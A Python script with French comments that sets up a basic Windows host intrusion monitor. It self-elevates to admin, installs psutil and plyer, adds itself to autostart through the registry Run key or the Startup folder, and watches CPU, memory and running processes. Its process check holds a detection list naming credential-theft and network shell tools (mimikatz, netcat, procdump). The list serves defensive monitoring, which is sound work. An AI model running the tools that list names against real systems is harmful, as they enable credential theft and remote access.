
import os
import sys
import time
import subprocess
import winreg
import logging
from threading import Thread
import ctypes
import traceback
import shutil

#  CONFIGURATION ROBUSTE  
def get_desktop_path():
    try:
        # Méthode 1: Variable d'environnement standard
        desktop = os.path.join(os.path.expanduser("~"), "Desktop")
        if os.path.exists(desktop):
            return desktop
        
        # Méthode 2: Registry Windows
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                               r"Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders")
            desktop = winreg.QueryValueEx(key, "Desktop")[0]
            winreg.CloseKey(key)
            if os.path.exists(desktop):
                return desktop
        except:
            pass
            
        # Méthode 3: Chemin par défaut
        desktop = os.path.join(os.environ['USERPROFILE'], 'Desktop')
        return desktop
    except Exception as e:
        # Fallback absolu
        return r"C:\Users\Public\Desktop"

# Configuration avec chemin robuste
DESKTOP_PATH = get_desktop_path()
IDS_FOLDER_NAME = "SystemHIDS_Surveillance"
IDS_FOLDER_PATH = os.path.join(DESKTOP_PATH, IDS_FOLDER_NAME)
LOG_FILE = os.path.join(IDS_FOLDER_PATH, "hids_log.txt")

#  SETUP LOGGING ROBUSTE 
def setup_logging():
    """Configure le logging de manière robuste"""
    try:
        # Créer le dossier de log si nécessaire
        log_dir = os.path.dirname(LOG_FILE)
        if not os.path.exists(log_dir):
            os.makedirs(log_dir, exist_ok=True)
        
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(LOG_FILE, encoding='utf-8'),
                logging.StreamHandler()
            ]
        )
        return True
    except Exception as e:
        # Fallback: logging console seulement
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[logging.StreamHandler()]
        )
        logging.error(f"Erreur configuration logs: {e}")
        return False

#  VÉRIFICATION ADMIN RENFORCÉE 
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    try:
        if not is_admin():
            logging.warning(" Relance avec privilèges administrateur...")
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, f'"{sys.argv[0]}"', None, 1
            )
            sys.exit(0)
        return True
    except Exception as e:
        logging.error(f" Échec élévation privilèges: {e}")
        return False

# === INSTALLATION MODULES ULTRA ROBUSTE ===
def install_packages():
    packages = ['psutil', 'plyer']
    
    for package in packages:
        max_attempts = 3
        for attempt in range(max_attempts):
            try:
                logging.info(f" Tentative {attempt+1}/{max_attempts} pour {package}...")
                
                # Méthode 1: pip standard
                subprocess.check_call([
                    sys.executable, "-m", "pip", "install", 
                    "--user", "--trusted-host", "pypi.org", 
                    "--trusted-host", "files.pythonhosted.org", package
                ], timeout=120)
                
                # Vérifier que l'installation a réussi
                subprocess.check_call([sys.executable, "-c", f"import {package}"])
                
                logging.info(f" {package} installé avec succès")
                break
                
            except subprocess.CalledProcessError as e:
                logging.warning(f" Méthode 1 échouée pour {package}: {e}")
                
                try:
                    # Méthode 2: pip avec upgrade
                    subprocess.check_call([
                        sys.executable, "-m", "pip", "install", 
                        "--upgrade", package
                    ], timeout=120)
                    logging.info(f" {package} installé via upgrade")
                    break
                except:
                    if attempt == max_attempts - 1:
                        logging.error(f" Échec installation de {package} après {max_attempts} tentatives")
                        return False
                    time.sleep(5)
                    
            except Exception as e:
                logging.error(f" Erreur inattendue avec {package}: {e}")
                if attempt == max_attempts - 1:
                    return False
                time.sleep(5)
    
    return True

# CRÉATION DOSSIER ROBUSTE 
def create_ids_folder():
    try:
        logging.info(f" Tentative création dossier: {IDS_FOLDER_PATH}")
        
        # Vérifier si le dossier existe déjà
        if os.path.exists(IDS_FOLDER_PATH):
            logging.info(" Dossier existe déjà")
            return True
        
        # Tentative de création
        os.makedirs(IDS_FOLDER_PATH, exist_ok=True)
        
        # Vérification que le dossier a été créé
        if not os.path.exists(IDS_FOLDER_PATH):
            logging.error(" Échec création dossier - vérification échouée")
            return False
        
        # Test d'écriture dans le dossier
        test_file = os.path.join(IDS_FOLDER_PATH, "test_write.txt")
        with open(test_file, 'w') as f:
            f.write("Test d'écriture réussi")
        os.remove(test_file)
        
        # Créer le fichier readme
        readme_path = os.path.join(IDS_FOLDER_PATH, "LISEZ_MOI.txt")
        with open(readme_path, 'w', encoding='utf-8') as f:
            f.write("=== SYSTÈME HIDS ===\n")
            f.write(f"Créé le: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Dossier: {IDS_FOLDER_PATH}\n")
            f.write("Surveillance active: CPU, Mémoire, Processus\n")
        
        logging.info(f" Dossier créé avec succès: {IDS_FOLDER_PATH}")
        return True
        
    except Exception as e:
        logging.error(f" Erreur création dossier: {e}")
        logging.error(traceback.format_exc())
        
        # Fallback: créer dans le répertoire temporaire
        try:
            fallback_path = os.path.join(os.environ['TEMP'], IDS_FOLDER_NAME)
            os.makedirs(fallback_path, exist_ok=True)
            logging.info(f" Dossier fallback créé: {fallback_path}")
            return True
        except:
            logging.error(" Échec création dossier fallback")
            return False

#  DÉMARRAGE AUTO ROBUSTE 
def setup_autostart():
    try:
        script_path = os.path.abspath(__file__)
        
        # Méthode 1: Registry Current User
        try:
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
                winreg.SetValueEx(reg_key, "SystemHIDS", 0, winreg.REG_SZ, f'"{sys.executable}" "{script_path}"')
            logging.info(" Démarrage auto configuré (Registry User)")
            return True
        except Exception as e:
            logging.warning(f"⚠ Registry User échoué: {e}")
        
        # Méthode 2: Dossier Startup
        try:
            startup_folder = os.path.join(
                os.environ['APPDATA'], 
                'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'
            )
            bat_path = os.path.join(startup_folder, "SystemHIDS.bat")
            with open(bat_path, 'w') as f:
                f.write(f'@echo off\n"{sys.executable}" "{script_path}"')
            logging.info(" Démarrage auto configuré (Dossier Startup)")
            return True
        except Exception as e:
            logging.warning(f" Dossier Startup échoué: {e}")
        
        logging.error(" Toutes méthodes démarrage auto ont échoué")
        return False
        
    except Exception as e:
        logging.error(f" Erreur configuration démarrage auto: {e}")
        return False

#  SURVEILLANCE ROBUSTE 
def monitor_system():
    try:
        # Import des modules avec vérification
        try:
            import psutil
            from plyer import notification
        except ImportError as e:
            logging.error(f" Modules manquants: {e}")
            return False
        
        logging.info(" Démarrage surveillance HIDS...")
        
        error_count = 0
        max_errors = 5
        
        while error_count < max_errors:
            try:
                # Surveillance CPU
                cpu_percent = psutil.cpu_percent(interval=2)
                if cpu_percent > 80:
                    logging.warning(f"CPU élevé: {cpu_percent}%")
                    try:
                        notification.notify(
                            title=" Alerte HIDS - CPU",
                            message=f"Utilisation: {cpu_percent}%",
                            timeout=5,
                            app_name="System HIDS"
                        )
                    except:
                        pass  # Notification échouée mais on continue
                
                # Surveillance Mémoire
                memory = psutil.virtual_memory()
                if memory.percent > 85:
                    logging.warning(f" Mémoire élevée: {memory.percent}%")
                    try:
                        notification.notify(
                            title=" Alerte HIDS - Mémoire",
                            message=f"Utilisation: {memory.percent}%",
                            timeout=5
                        )
                    except:
                        pass
                
                # Surveillance Processus
                suspicious_list = ['mimikatz', 'netcat', 'nc64', 'nc', 'wce', 'procdump']
                for proc in psutil.process_iter(['name']):
                    try:
                        proc_name = proc.info['name'].lower()
                        if any(susp in proc_name for susp in suspicious_list):
                            logging.warning(f" PROCESSUS SUSPECT: {proc_name}")
                            try:
                                notification.notify(
                                    title=" ALERTE HIDS - Processus Suspect",
                                    message=f"Processus détecté: {proc_name}",
                                    timeout=10
                                )
                            except:
                                pass
                    except (psutil.NoSuchProcess, psutil.AccessDenied):
                        pass
                
                # Réinitialiser le compteur d'erreurs si tout va bien
                error_count = 0
                time.sleep(15)  # Surveillance toutes les 15 secondes
                
            except Exception as e:
                error_count += 1
                logging.error(f" Erreur surveillance (#{error_count}): {e}")
                time.sleep(30)  # Attendre plus longtemps en cas d'erreur
        
        logging.error(f" Trop d'erreurs ({error_count}), arrêt surveillance")
        return False
        
    except Exception as e:
        logging.error(f" Erreur critique surveillance: {e}")
        logging.error(traceback.format_exc())
        return False

#  FONCTION PRINCIPALE ULTRA ROBUSTE 
def main():
    """Fonction principale avec gestion d'erreurs complète"""
    try:
        # Setup logging
        if not setup_logging():
            print(" Impossible de configurer les logs")
            return False
        
        logging.info("=" * 60)
        logging.info(" DÉMARRAGE SYSTÈME HIDS - VERSION ULTRA ROBUSTE")
        logging.info("=" * 60)
        
        # Vérifier et élever les privilèges
        if not is_admin():
            logging.warning(" Script exécuté sans droits admin")
            logging.warning("Tentative d'élévation des privilèges...")
            if not run_as_admin():
                logging.warning(" Continuation sans droits admin")
        
        # ÉTAPE 1: Installation packages
        logging.info(" ÉTAPE 1: Installation des modules...")
        if not install_packages():
            logging.error(" CRITIQUE: Échec installation modules")
            return False
        
        # ÉTAPE 2: Création dossier
        logging.info(" ÉTAPE 2: Création dossier surveillance...")
        if not create_ids_folder():
            logging.error(" CRITIQUE: Échec création dossier")
            return False
        
        # ÉTAPE 3: Démarrage auto
        logging.info("⚙ ÉTAPE 3: Configuration démarrage automatique...")
        setup_autostart()
        
        # ÉTAPE 4: Surveillance
        logging.info(" ÉTAPE 4: Démarrage surveillance...")
        
        # Lancer la surveillance dans un thread
        monitor_thread = Thread(target=monitor_system, daemon=True)
        monitor_thread.start()
        
        # Message de succès
        logging.info("" * 10)
        logging.info(" SYSTÈME HIDS OPÉRATIONNEL!")
        logging.info(f" Dossier: {IDS_FOLDER_PATH}")
        logging.info(f" Logs: {LOG_FILE}")
        logging.info(" Surveillance active: CPU, Mémoire, Processus")
        logging.info(" Démarrage auto configuré")
        logging.info(" Redémarrage automatique en cas de crash")
        logging.info(" Ctrl+C pour arrêter proprement")
        logging.info("" * 10)
        
        # Boucle principale avec heartbeat
        heartbeat = 0
        while True:
            if heartbeat % 60 == 0:  # Toutes les minutes
                logging.info(" Heartbeat - Système actif")
            
            # Vérifier que le thread de surveillance tourne toujours
            if not monitor_thread.is_alive():
                logging.error(" Thread surveillance arrêté!")
                break
                
            time.sleep(1)
            heartbeat += 1
            
    except KeyboardInterrupt:
        logging.info(" Arrêt demandé par l'utilisateur")
    except Exception as e:
        logging.error(f" ERREUR CRITIQUE MAIN: {e}")
        logging.error(traceback.format_exc())
        return False
    
    return True

# === POINT D'ENTRÉE AVEC REDÉMARRAGE AUTOMATIQUE ===
if __name__ == "__main__":
    crash_count = 0
    max_crashes = 5
    
    while crash_count < max_crashes:
        try:
            success = main()
            if success:
                logging.info(" Arrêt normal du système HIDS")
                break
            else:
                crash_count += 1
                logging.error(f" Crash #{crash_count}/{max_crashes}")
        except Exception as e:
            crash_count += 1
            logging.error(f" Exception non gérée #{crash_count}: {e}")
        
        if crash_count < max_crashes:
            wait_time = 10 * crash_count  # Attente progressive
            logging.info(f" Redémarrage dans {wait_time} secondes...")
            time.sleep(wait_time)
        else:
            logging.error(" TROP DE CRASHES - ARRÊT DÉFINITIF")
            input("Appuyez sur Entrée pour quitter...")
